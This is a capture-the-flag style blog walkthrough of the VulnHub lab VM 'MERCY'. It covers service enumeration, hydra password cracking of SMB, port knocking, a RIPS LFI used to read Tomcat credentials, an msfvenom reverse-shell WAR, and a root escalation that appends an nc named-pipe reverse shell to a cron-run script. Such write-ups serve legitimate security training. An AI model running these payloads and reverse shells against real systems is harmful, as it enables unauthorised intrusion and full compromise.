---
layout: post
title: "digitalworld.local: MERCY Walkthrough"
subtitle: "Blessed are the merciful, for they shall obtain mercy."
date: 2018-11-25 17:53:38 +0000
last_modified_at: 2018-11-25 17:59:34 +0000
category: Walkthrough
tags: [VulnHub, digitalworld.local]
comments: true
image:
  feature: digitalworld.local-mercy-walkthrough.jpg
  credit: Alexas_Fotos / Pixabay
  creditlink: https://pixabay.com/en/i-beg-your-pardon-excuse-me-frog-927748/
---

This post documents the complete walkthrough of digitalworld.local: MERCY, a boot2root [VM][1] created by [Donavan][2], and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## Background

The author feels bittersweet about this box. On one hand, it was a box designed as a dedication to the sufferance put through by the Offensive Security team for PWK. I thought I would pay it forward by creating a vulnerable machine too. This is not meant to be a particularly difficult machine, but is meant to bring you through a good number of enumerative steps through a variety of techniques.

## Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.20.130
...
PORT     STATE    SERVICE     REASON              VERSION
22/tcp   filtered ssh         port-unreach ttl 64
53/tcp   open     domain      syn-ack ttl 64      ISC BIND 9.9.5-3ubuntu0.17 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.9.5-3ubuntu0.17-Ubuntu
80/tcp   filtered http        port-unreach ttl 64
110/tcp  open     pop3        syn-ack ttl 64      Dovecot pop3d
|_pop3-capabilities: SASL UIDL CAPA STLS PIPELINING AUTH-RESP-CODE RESP-CODES TOP
|_ssl-date: TLS randomness does not represent time
139/tcp  open     netbios-ssn syn-ack ttl 64      Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp  open     imap        syn-ack ttl 64      Dovecot imapd (Ubuntu)
|_imap-capabilities: IMAP4rev1 IDLE OK listed have post-login more capabilities ENABLE Pre-login LOGINDISABLEDA0001 LITERAL+ LOGIN-REFERRALS SASL-IR STARTTLS ID
|_ssl-date: TLS randomness does not represent time
445/tcp  open     netbios-ssn syn-ack ttl 64      Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
993/tcp  open     ssl/imaps?  syn-ack ttl 64
|_ssl-date: TLS randomness does not represent time
995/tcp  open     ssl/pop3s?  syn-ack ttl 64
|_ssl-date: TLS randomness does not represent time
8080/tcp open     http        syn-ack ttl 64      Apache Tomcat/Coyote JSP engine 1.1
| http-methods:
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
| http-robots.txt: 1 disallowed entry
|_/tryharder/tryharder
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat
```

Whoa! Samba is up. Haven't seen that in a while. Along with it, you can also see `22/tcp` and `80/tcp` filtered by the firewall. In any case, let's focus on the Apache Tomcat first since `nmap` finds the presence of a disallowed entry `/tryharder/tryharder` in `robots.txt`.

<a class="image-popup">
![901bdbd2.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/901bdbd2.png)
</a>

Looks like `base64` to me. Let's decode it and see what it says.

<a class="image-popup">
![7afb37cc.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/7afb37cc.png)
</a>

Duh?! Nothing useful at the moment.

Now, let's switch our attention to the Tomcat installation.

<a class="image-popup">
![5e58c8b0.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/5e58c8b0.png)
</a>

From my experience, entering the manager webapp requires authentication. I'm not even going to try that, having no information of the usernames and passwords whatsoever.

Tomcat is a shit-show. Time to go over to Samba.

## Samba 4.3.11

One can list down the services available in Samba with `smbclient` like so.

<a class="image-popup">
![789d6f24.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/789d6f24.png)
</a>

What do we have here? A Samba share! Woohoo. Let's see if we can mount it without credentials.

<a class="image-popup">
![0d0cd907.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/0d0cd907.png)
</a>

Oops! I recall `hydra` is able to crack SMB passwords online. Time to give it a shot.

I'm assuming the username is `qiu`.

<a class="image-popup">
![b7918310.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/b7918310.png)
</a>

That was fast!

<a class="image-popup">
![c26b7415.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/c26b7415.png)
</a>

Not too bad, I must say.

## Open Sesame

The `.private` directory offers some important system information as follows.

<a class="image-popup">
![93160038.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/93160038.png)
</a>

Well well well. Port-knocking. Let's write a port-knocking script, using `nmap` to do the deed.

<div class="filename"><span>knock.sh</span></div>

```bash
#!/bin/bash

TARGET=$1
PORTS=$2

for ports in $(tr ',' ' ' <<<"$PORTS"); do
    echo "[*] Trying sequence $ports..."
    for p in $(echo $ports | tr ',' ' '); do
        nmap -n -v0 -Pn --max-retries 0 -p $p $TARGET
    done
done
```

__Open HTTP__

<a class="image-popup">
![4bd8b4f1.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/4bd8b4f1.png)
</a>

__Open SSH__

<a class="image-popup">
![f25408df.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/f25408df.png)
</a>

With two more open ports, let's get down to business.

<a class="image-popup">
![f573f6ed.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/f573f6ed.png)
</a>

I'm not amused&hellip; Moving on with the exploration, I find the presence of RIPS 0.53 as follows.

<a class="image-popup">
![f8012b3d.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/f8012b3d.png)
</a>

According to EDB-ID [18660](https://www.exploit-db.com/exploits/18660/), RIPS 0.53 is susceptible to multiple local file inclusion (LFI) vulnerabilities. Let's check it out.

<a class="image-popup">
![b82d6fca.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/b82d6fca.png)
</a>

It's an LFI alright.

## Tomcat Revisit

We can expose the passwords in `tomcat-users.xml` by making use of the LFI vulnerability.

<a class="image-popup">
![3f5186f0.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/3f5186f0.png)
</a>

Armed with the credentials, we can now log in to the manager webapp to deploy our evil webapp, a WAR file that allows a reverse shell callback.

<a class="image-popup">
![133aa32a.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/133aa32a.png)
</a>

We can use `msfvenom` to generate such a WAR file like so.

```
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.20.128 LPORT=4444 -f war -o evil.war
```

By the way, we are dealing with a 32-bit Ubuntu.

<a class="image-popup">
![37d41566.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/37d41566.png)
</a>

I've successfully deployed the webapp.

<a class="image-popup">
![2c7236f3.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/2c7236f3.png)
</a>

On one hand, set up your `nc` listener. On the other hand, look for the JSP page to access in the WAR file like so.

<a class="image-popup">
![607da0fe.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/607da0fe.png)
</a>

To access the malicious webapp, enter the following into your browser's address bar:

```
http://192.168.20.130/evil/tudvpurwgjh.jsp
```

I humbly present a low-privilege shell.

<a class="image-popup">
![74e9999e.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/74e9999e.png)
</a>

Before I forget, the proof of a low-privilege shell is at `/local.txt`.

<a class="image-popup">
![40848530.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/40848530.png)
</a>

## Privilege Escalation

I found out that I can log in to `fluffy`'s account with the password retrieved from `tomcat-users.xml`. And during enumeration, I also found out the way to escalate privilege to `root`.

There's a script at `/home/fluffy/.private/secrets/timeclock` that will run every three minutes (under `root` privilege) to write the current date to `/var/www/html/time`. The script is world-writable.

I append the following command to the script.

```
$ echo "rm -rf /tmp/p; mknod /tmp/p p; /bin/sh 0</tmp/p | nc 192.168.20.128 5555 1>/tmp/p" >> timeclock
```

Set up another `nc` listener at `5555/tcp`. Three minutes later, I have `root` shell.

<a class="image-popup">
![7c7b76af.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/7c7b76af.png)
</a>

Before I forget, here's the proof that I'm `root`.

<a class="image-popup">
![d818319a.png](/assets/images/posts/digitalworld.local-mercy-walkthrough/d818319a.png)
</a>

:dancer:

[1]: https://www.vulnhub.com/entry/digitalworldlocal-mercy,263/
[2]: https://www.vulnhub.com/author/donavan,601/
[3]: https://www.vulnhub.com/
